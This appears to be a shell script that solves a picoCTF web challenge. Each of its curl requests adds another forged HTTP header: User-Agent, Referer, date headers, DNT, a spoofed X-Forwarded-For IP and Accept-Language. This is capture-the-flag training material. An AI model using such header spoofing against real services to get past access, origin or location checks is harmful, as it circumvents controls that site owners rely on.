
server="http://mercury.picoctf.net:36622";
proxy="46.246.120.155";

curl "$server/" > index.html;

curl --user-agent "PicoBrowser" "$server/" > flag1.html;
curl --user-agent "PicoBrowser" --referer "$server" "$server/" > flag2.html;
curl --user-agent "PicoBrowser" --referer "$server" -H "If-Modified-Since: Thu, 01 Mar 2018 01:02:03 GMT" -H "Date: Thu, 01 Mar 2018 01:02:03 GMT" "$server/" > flag3.html;
curl --user-agent "PicoBrowser" --referer "$server" -H "If-Modified-Since: Thu, 01 Mar 2018 01:02:03 GMT" -H "Date: Thu, 01 Mar 2018 01:02:03 GMT" -H "DNT: 1" "$server/" > flag4.html;
curl --user-agent "PicoBrowser" --referer "$server" -H "If-Modified-Since: Thu, 01 Mar 2018 01:02:03 GMT" -H "Date: Thu, 01 Mar 2018 01:02:03 GMT" -H "DNT: 1" "$server/" -H "X-Forwarded-For: $proxy" > flag5.html;
curl --user-agent "PicoBrowser" --referer "$server" -H "If-Modified-Since: Thu, 01 Mar 2018 01:02:03 GMT" -H "Date: Thu, 01 Mar 2018 01:02:03 GMT" -H "DNT: 1" "$server/" -H "X-Forwarded-For: $proxy" -H "Accept-Language: sv-sv; q=0.5" > flag6.html;

